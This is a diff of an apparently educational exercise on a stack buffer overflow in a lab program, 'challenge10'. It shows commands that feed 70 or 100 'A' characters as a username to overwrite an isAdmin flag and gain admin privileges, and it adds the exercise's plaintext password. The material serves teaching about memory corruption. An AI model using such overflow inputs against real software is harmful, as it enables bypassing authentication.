@@ -11,7 +11,7 @@ will change the function flow, which enables us to gain "admin" privileges.
 We have the following program:
 
 challenge10.c:
-```
+```c
 #include <stdio.h>
 #include <stdlib.h>
 #include <crypt.h>
@@ -77,8 +77,10 @@ You are not admin.
 isAdmin: 0x0
 ```
 
-Lets execute it with the correct password:
+The password "test" seems to be not correct, as the program tells us "You are not admin".
 
+
+Lets execute it with the correct password `ourteacheristehbest`:
 ```
 root@hlUbuntu32aslr:~/challenges/challenge10# ./challenge10 sheldon ourteacheristehbest
 Hello cmd-sheldon.
@@ -95,7 +97,7 @@ What happens when you insert a string which is longer than 64 bytes? Lets try it
 We can use python to print 70 characters:
 
 ```
-root@hlUbuntu32aslr:~/challenges/challenge10# ./challenge10 `python -c 'print "A"*70'` root
+root@hlUbuntu32aslr:~/challenges/challenge10# ./challenge10 `python -c 'print "A"*70'` test
 Hello cmd-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.
 You are admin!
 isAdmin: 0x41414141
@@ -106,7 +108,7 @@ isAdmin: 0x41414141
 What if we even add some more characters? Lets say 100.
 
 ```
-root@hlUbuntu32aslr:~/challenges/challenge10# ./challenge10 `python -c 'print "A"*100'` root
+root@hlUbuntu32aslr:~/challenges/challenge10# ./challenge10 `python -c 'print "A"*100'` test
 Hello cmd-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.
 You are admin!
 isAdmin: 0x41414141
@@ -116,8 +118,5 @@ Segmentation fault (core dumped)
 
 ## Questions
 
-### Question 1: Why isAdmin = TRUE?
-
-If you enter the valid password (ourteacheristehbest), the program returns "You ARE admin!"
-If you enter an overlong password (70x"A"), the program returns "You ARE admin!" too.
-Explain why you got admin privs when smashing the stack.
+* What is happening here? Why Are we "admin" if we use a username which is 70 bytes long?
+* Why does it crash, if we use a username which is 100 bytes long?
